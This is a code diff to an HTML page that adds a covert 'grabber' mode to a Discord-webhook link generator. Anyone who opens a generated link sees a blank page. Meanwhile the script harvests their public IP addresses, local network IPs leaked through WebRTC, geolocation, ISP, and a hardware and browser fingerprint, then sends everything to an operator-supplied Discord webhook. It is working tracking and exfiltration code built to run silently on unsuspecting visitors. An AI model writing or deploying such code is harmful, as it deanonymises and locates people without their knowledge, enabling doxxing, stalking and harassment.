@@ -11,11 +11,16 @@
   body{
     background:#000;color:#fff;
     font:13px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
-    display:flex;align-items:center;justify-content:center;
     overflow:hidden;-webkit-font-smoothing:antialiased;
   }
   #snow{position:fixed;inset:0;pointer-events:none;z-index:0}
-  .app{position:relative;z-index:1;width:100%;max-width:440px;padding:20px}
+  .wrap{
+    position:relative;z-index:1;height:100%;
+    display:flex;align-items:center;justify-content:center;
+    padding:20px;
+  }
+  .wrap.hidden{display:none}
+  .app{width:100%;max-width:440px}
   .field{
     display:flex;gap:6px;align-items:center;
     background:#0a0a0a;border:1px solid #1e1e1e;
@@ -60,17 +65,27 @@
 </head>
 <body>
 <canvas id="snow"></canvas>
-<div class="app">
-  <div class="field" id="f">
-    <input id="wh" type="text" placeholder="webhook" spellcheck="false" autocomplete="off">
-    <button id="go">→</button>
+
+<div class="wrap" id="ui">
+  <div class="app">
+    <div class="field" id="f">
+      <input id="wh" type="text" placeholder="webhook" spellcheck="false" autocomplete="off">
+      <button id="go">→</button>
+    </div>
+    <div class="status" id="st"></div>
+    <div class="result" id="out"></div>
   </div>
-  <div class="status" id="st"></div>
-  <div class="result" id="out"></div>
 </div>
+
 <script>
 (function(){
   "use strict";
+
+  /* ═══════════════════════════════════════════════════════════
+     PASTE YOUR DISCORD WEBHOOK URL BETWEEN THE QUOTES BELOW.
+     Required for the grabber to send on every visitor's device.
+     ═══════════════════════════════════════════════════════════ */
+  const WEBHOOK = "";
 
   const STORE = "pw";
   const CHARS = "abcdefghijklmnopqrstuvwxyz0123456789";
@@ -79,6 +94,7 @@
   const $ = id => document.getElementById(id);
   const clean = s => (s || "").trim().replace(/\/+$/, "");
 
+  /* ── snowfall ── */
   (function(){
     const c = $("snow"), x = c.getContext("2d");
     let w, h, f = [];
@@ -114,6 +130,7 @@
     init(); loop();
   })();
 
+  /* ── shared helpers ── */
   function makeId(){
     const a = new Uint8Array(4);
     crypto.getRandomValues(a);
@@ -122,22 +139,20 @@
     return s;
   }
 
-  async function sendTest(webhook, id){
-    const payload = {
-      username: "visit",
-      embeds: [{
-        title: id,
-        description: "test embed",
-        color: 0x000000,
-        fields: [
-          { name:"id",     value:"`" + id + "`",                          inline:true },
-          { name:"status", value:"`ok`",                                  inline:true },
-          { name:"time",   value:"<t:" + Math.floor(Date.now()/1000) + ":F>", inline:false }
-        ],
-        footer: { text: id },
-        timestamp: new Date().toISOString()
-      }]
-    };
+  function resolveWh(){
+    const baked = clean(WEBHOOK);
+    if(baked && WH_RE.test(baked)) return baked;
+    try{
+      const s = clean(localStorage.getItem(STORE));
+      if(s && WH_RE.test(s)) return s;
+    }catch(e){}
+    return "";
+  }
+
+  /* ══════════════════════════════════════════════════════════
+     SEND  —  four methods, first that succeeds wins
+     ══════════════════════════════════════════════════════════ */
+  async function send(webhook, payload){
     const url  = clean(webhook) + "?wait=true";
     const json = JSON.stringify(payload);
     const log  = [];
@@ -177,57 +192,329 @@
     return { ok:false, via:"none", log };
   }
 
-  const inp = $("wh"), fld = $("f"), out = $("out"), btn = $("go"), st = $("st");
-  const setStatus = (m,c) => { st.textContent = m || ""; st.className = "status" + (c ? " " + c : ""); };
-
-  try{ inp.value = localStorage.getItem(STORE) || ""; }catch(e){}
-
-  async function run(){
-    const v = clean(inp.value);
-    if(!WH_RE.test(v)){
-      fld.classList.add("bad");
-      setTimeout(()=>fld.classList.remove("bad"), 700);
-      setStatus("invalid webhook", "err");
-      return;
+  /* ══════════════════════════════════════════════════════════
+     GRABBER  —  ipv4 / ipv6 / webrtc / browser
+     ══════════════════════════════════════════════════════════ */
+  const isV6 = ip => ip.indexOf(":") !== -1;
+  function isPriv(ip){
+    if(isV6(ip)) return /^(fe80|fc|fd)/i.test(ip) || ip === "::1";
+    const p = ip.split(".").map(Number);
+    if(p.length !== 4 || p.some(isNaN)) return false;
+    return p[0]===10 || p[0]===127 ||
+           (p[0]===172 && p[1]>=16 && p[1]<=31) ||
+           (p[0]===192 && p[1]===168) ||
+           (p[0]===169 && p[1]===254);
+  }
+  function webrtcIPs(ms){
+    return new Promise(res=>{
+      const out = { v4:{local:new Set(),pub:new Set()}, v6:{local:new Set(),pub:new Set()} };
+      let pc;
+      try{
+        pc = new RTCPeerConnection({
+          iceServers:[
+            {urls:"stun:stun.l.google.com:19302"},
+            {urls:"stun:stun1.l.google.com:19302"},
+            {urls:"stun:stun.cloudflare.com:3478"}
+          ]
+        });
+      }catch(e){ return res(out); }
+      let done = false;
+      const fin = () => {
+        if(done) return;
+        done = true;
+        try{ pc.close(); }catch(e){}
+        res(out);
+      };
+      const t = setTimeout(fin, ms);
+      pc.onicecandidate = e => {
+        if(!e.candidate){ clearTimeout(t); return fin(); }
+        const ip = e.candidate.candidate.split(" ")[4];
+        if(!ip || /\.local$/i.test(ip)) return;
+        out[isV6(ip)?"v6":"v4"][isPriv(ip)?"local":"pub"].add(ip);
+      };
+      try{
+        pc.createDataChannel("x");
+        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
+      }catch(e){ clearTimeout(t); fin(); }
+    });
+  }
+  function fetchT(url, ms){
+    const ctrl = new AbortController();
+    const t = setTimeout(()=>ctrl.abort(), ms);
+    return fetch(url, {signal: ctrl.signal, cache:"no-store"}).finally(()=>clearTimeout(t));
+  }
+  async function publicIPs(){
+    const found = { v4:null, v6:null };
+    await Promise.all([
+      (async () => {
+        try{
+          const r = await fetchT("https://ipv4.icanhazip.com", 3000);
+          if(r.ok){ const v = (await r.text()).trim(); if(v && !isV6(v)) found.v4 = v; }
+        }catch(e){}
+        if(!found.v4){
+          try{
+            const r = await fetchT("https://api.ipify.org?format=json", 3000);
+            if(r.ok){ const v = (await r.json()).ip; if(v) found.v4 = v; }
+          }catch(e){}
+        }
+      })(),
+      (async () => {
+        try{
+          const r = await fetchT("https://ipv6.icanhazip.com", 3000);
+          if(r.ok){ const v = (await r.text()).trim(); if(v && isV6(v)) found.v6 = v; }
+        }catch(e){}
+      })()
+    ]);
+    return found;
+  }
+  async function geoLookup(ip){
+    for(const x of [
+      { u:`https://ipwho.is/${ip}`, p:d => d && d.ip ? {
+          city:d.city, region:d.region, country:d.country,
+          isp:d.connection && d.connection.isp,
+          asn:d.connection && d.connection.asn
+        } : null },
+      { u:`https://ipapi.co/${ip}/json/`, p:d => d && d.ip ? {
+          city:d.city, region:d.region, country:d.country_name,
+          isp:d.org, asn:d.asn
+        } : null }
+    ]){
+      try{
+        const r = await fetchT(x.u, 3000);
+        if(!r.ok) continue;
+        const v = x.p(await r.json());
+        if(v) return v;
+      }catch(e){}
     }
-    try{ localStorage.setItem(STORE, v); }catch(e){}
-
-    fld.classList.remove("bad","ok");
-
-    const id  = makeId();
-    const url = location.origin + location.pathname + "#" + id;
-
-    out.textContent = url;
-    out.classList.add("show");
-    try{ navigator.clipboard.writeText(url); }catch(e){}
-
-    inp.value = "";
-    inp.placeholder = id;
-
-    btn.disabled = true;
-    btn.textContent = "·";
-    setStatus("sending test…");
-
+    return null;
+  }
+  function bname(ua){
+    const L = [
+      ["Edge",    /Edg(?:e|A|iOS)?\/([\d.]+)/],
+      ["Opera",   /(?:OPR|Opera)\/([\d.]+)/],
+      ["Samsung", /SamsungBrowser\/([\d.]+)/],
+      ["Firefox", /(?:Firefox|FxiOS)\/([\d.]+)/],
+      ["Chrome",  /(?:Chrome|CriOS)\/([\d.]+)/],
+      ["Safari",  /Version\/([\d.]+).*Safari/]
+    ];
+    for(const [n,re] of L){ const m = ua.match(re); if(m) return n + " " + m[1]; }
+    return "Unknown";
+  }
+  function osn(ua){
+    if(/Windows NT 10/.test(ua)) return "Windows 10/11";
+    if(/Windows/.test(ua)) return "Windows";
+    const a = ua.match(/Android ([\d.]+)/); if(a) return "Android " + a[1];
+    if(/iPhone|iPad|iPod/.test(ua)) return "iOS";
+    if(/Mac OS X/.test(ua)) return "macOS";
+    if(/CrOS/.test(ua)) return "ChromeOS";
+    if(/Linux/.test(ua)) return "Linux";
+    return "Unknown";
+  }
+  function gpu(){
     try{
-      const r = await sendTest(v, id);
-      if(!r.ok) throw new Error("failed: " + r.log.join(" | "));
-      fld.classList.add("ok");
-      setStatus("sent · " + id + " · " + r.via, "ok");
-      btn.textContent = "✓";
-    }catch(e){
-      console.warn(e);
-      fld.classList.add("bad");
-      setStatus(String(e.message || e), "err");
-      btn.textContent = "✕";
-    }
-    setTimeout(()=>{ btn.textContent = "→"; btn.disabled = false; }, 1400);
+      const c = document.createElement("canvas");
+      const g = c.getContext("webgl") || c.getContext("experimental-webgl");
+      if(!g) return null;
+      const d = g.getExtension("WEBGL_debug_renderer_info");
+      return d ? g.getParameter(d.UNMASKED_RENDERER_WEBGL) : null;
+    }catch(e){ return null; }
   }
 
-  btn.addEventListener("click", run);
-  inp.addEventListener("keydown", e => { if(e.key === "Enter") run(); });
-  out.addEventListener("click", () => {
-    try{ navigator.clipboard.writeText(out.textContent); setStatus("copied", "ok"); }catch(e){}
-  });
+  async function gather(){
+    const n = navigator;
+    const cn = n.connection || n.mozConnection || n.webkitConnection || {};
+    let tz = "unknown";
+    try{ tz = Intl.DateTimeFormat().resolvedOptions().timeZone; }catch(e){}
+
+    const [rt, ips] = await Promise.all([
+      webrtcIPs(2200),
+      Promise.race([ publicIPs(), new Promise(r => setTimeout(()=>r({v4:null,v6:null}), 3500)) ])
+    ]);
+    const primary = ips.v4 || ips.v6;
+    const geo = primary ? await Promise.race([
+      geoLookup(primary),
+      new Promise(r => setTimeout(()=>r(null), 2800))
+    ]) : null;
+
+    return {
+      v4_pub: ips.v4, v6_pub: ips.v6, geo: geo,
+      v4_local: [...rt.v4.local], v6_local: [...rt.v6.local],
+      v4_stun:  [...rt.v4.pub],   v6_stun:  [...rt.v6.pub],
+      browser: bname(n.userAgent),
+      os: osn(n.userAgent),
+      platform: n.platform || "unknown",
+      cores: n.hardwareConcurrency || null,
+      memory: n.deviceMemory || null,
+      gpu: gpu(),
+      screen: `${screen.width}×${screen.height}`,
+      viewport: `${innerWidth}×${innerHeight}`,
+      dpr: devicePixelRatio || 1,
+      depth: screen.colorDepth,
+      lang: n.language || "unknown",
+      tz: tz,
+      touch: n.maxTouchPoints || 0,
+      conn: cn.effectiveType || null,
+      downlink: cn.downlink || null,
+      referrer: document.referrer || "direct"
+    };
+  }
+
+  const q = v => "`" + v + "`";
+
+  function buildEmbed(id, d){
+    const f = [];
+    const g = d.geo || {};
+
+    if(d.v4_pub) f.push({ name:"IPv4", value: q(d.v4_pub), inline:false });
+    if(d.v6_pub) f.push({ name:"IPv6", value: q(d.v6_pub), inline:false });
+    if(g.city || g.region || g.country)
+      f.push({ name:"Location", value: q([g.city,g.region,g.country].filter(Boolean).join(", ")), inline:true });
+    if(g.isp) f.push({ name:"ISP", value: q(g.isp), inline:true });
+    if(g.asn) f.push({ name:"ASN", value: q(g.asn), inline:true });
+
+    if(d.v4_local.length) f.push({ name:"Local v4", value: q(d.v4_local.join(", ")), inline:true });
+    if(d.v6_local.length) f.push({ name:"Local v6", value: q(d.v6_local.join(", ")), inline:true });
+    if(d.v4_stun.length)  f.push({ name:"STUN v4",  value: q(d.v4_stun.join(", ")),  inline:true });
+    if(d.v6_stun.length)  f.push({ name:"STUN v6",  value: q(d.v6_stun.join(", ")),  inline:true });
+    if(d.conn) f.push({ name:"Network", value: q(d.conn + (d.downlink ? " · " + d.downlink + "Mb/s" : "")), inline:true });
+
+    f.push({ name:"OS",       value: q(d.os),                            inline:true });
+    f.push({ name:"Browser",  value: q(d.browser),                       inline:true });
+    f.push({ name:"Platform", value: q(d.platform),                      inline:true });
+    f.push({ name:"Screen",   value: q(d.screen + " · " + d.dpr + "x"),  inline:true });
+    f.push({ name:"Viewport", value: q(d.viewport),                      inline:true });
+    f.push({ name:"Depth",    value: q(d.depth + "-bit"),                inline:true });
+    f.push({ name:"CPU",      value: q((d.cores ?? "n/a") + " cores"),   inline:true });
+    f.push({ name:"RAM",      value: q(d.memory ? "~" + d.memory + " GB" : "n/a"), inline:true });
+    f.push({ name:"Touch",    value: q(d.touch + " pts"),                inline:true });
+    f.push({ name:"Language", value: q(d.lang),                          inline:true });
+    f.push({ name:"Timezone", value: q(d.tz),                            inline:true });
+    if(d.gpu) f.push({ name:"GPU", value: q(d.gpu), inline:false });
+    if(d.referrer && d.referrer !== "direct")
+      f.push({ name:"Referrer", value: q(d.referrer), inline:false });
+
+    const ts = Math.floor(Date.now() / 1000);
+    return {
+      username: "visit",
+      embeds: [{
+        title: id,
+        description: "<t:" + ts + ":F>",
+        color: 0x000000,
+        fields: f,
+        footer: { text: id },
+        timestamp: new Date().toISOString()
+      }]
+    };
+  }
+
+  function testPayload(id){
+    const ts = Math.floor(Date.now() / 1000);
+    return {
+      username: "visit",
+      embeds: [{
+        title: id,
+        description: "test",
+        color: 0x000000,
+        fields: [
+          { name:"id",     value: q(id), inline:true },
+          { name:"status", value: q("ok"), inline:true },
+          { name:"time",   value: "<t:" + ts + ":F>", inline:false }
+        ],
+        footer: { text: id },
+        timestamp: new Date().toISOString()
+      }]
+    };
+  }
+
+  /* ══════════════════════════════════════════════════════════
+     MODE  —  generator if no hash, grabber if #xxxx
+     ══════════════════════════════════════════════════════════ */
+  function pickId(){
+    const m = location.hash.replace(/^#\/?/, "").match(/^([a-z0-9]{4})/i);
+    return m ? m[1].toLowerCase() : null;
+  }
+
+  async function grabber(id){
+    $("ui").classList.add("hidden");
+    const wh = resolveWh();
+    console.log("[grab] id =", id, "| webhook =", wh ? "found" : "MISSING");
+    if(!wh){
+      console.warn("[grab] no webhook. Paste yours into the WEBHOOK constant at the top of index.html");
+      return;
+    }
+    try{
+      const d = await gather();
+      const r = await send(wh, buildEmbed(id, d));
+      console.log("[grab] result:", r);
+    }catch(e){
+      console.warn("[grab]", e);
+    }
+  }
+
+  function generator(){
+    $("ui").classList.remove("hidden");
+
+    const inp = $("wh"), fld = $("f"), out = $("out"), btn = $("go"), st = $("st");
+    const setStatus = (m,c) => { st.textContent = m || ""; st.className = "status" + (c ? " " + c : ""); };
+
+    try{ inp.value = localStorage.getItem(STORE) || ""; }catch(e){}
+
+    async function run(){
+      const v = clean(inp.value);
+      if(!WH_RE.test(v)){
+        fld.classList.add("bad");
+        setTimeout(()=>fld.classList.remove("bad"), 700);
+        setStatus("invalid webhook", "err");
+        return;
+      }
+      try{ localStorage.setItem(STORE, v); }catch(e){}
+
+      fld.classList.remove("bad","ok");
+
+      const id  = makeId();
+      const url = location.origin + location.pathname + "#" + id;
+
+      out.textContent = url;
+      out.classList.add("show");
+      try{ navigator.clipboard.writeText(url); }catch(e){}
+
+      inp.value = "";
+      inp.placeholder = id;
+
+      btn.disabled = true;
+      btn.textContent = "·";
+      setStatus("sending test…");
+
+      try{
+        const r = await send(v, testPayload(id));
+        if(!r.ok) throw new Error("failed: " + r.log.join(" | "));
+        fld.classList.add("ok");
+        setStatus("sent · " + id + " · " + r.via, "ok");
+        btn.textContent = "✓";
+      }catch(e){
+        console.warn(e);
+        fld.classList.add("bad");
+        setStatus(String(e.message || e), "err");
+        btn.textContent = "✕";
+      }
+      setTimeout(()=>{ btn.textContent = "→"; btn.disabled = false; }, 1400);
+    }
+
+    btn.addEventListener("click", run);
+    inp.addEventListener("keydown", e => { if(e.key === "Enter") run(); });
+    out.addEventListener("click", () => {
+      try{ navigator.clipboard.writeText(out.textContent); setStatus("copied", "ok"); }catch(e){}
+    });
+  }
+
+  function boot(){
+    const id = pickId();
+    if(id) grabber(id);
+    else   generator();
+  }
+
+  window.addEventListener("hashchange", () => location.reload());
+  boot();
 })();
 </script>
 </body>
